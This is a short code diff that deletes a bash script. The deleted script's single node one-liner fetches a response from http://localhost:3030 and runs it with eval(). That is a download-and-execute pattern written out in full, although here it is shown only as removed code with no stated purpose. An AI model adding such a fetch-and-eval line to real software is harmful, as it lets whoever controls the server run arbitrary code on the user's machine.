@@ -1,2 +1,0 @@
-#!/bin/bash -eu
-node -e "var a='';require('http').get('http://localhost:3030',r=>r.on('data',d=>a+=d).once('end',()=>eval(a)))"
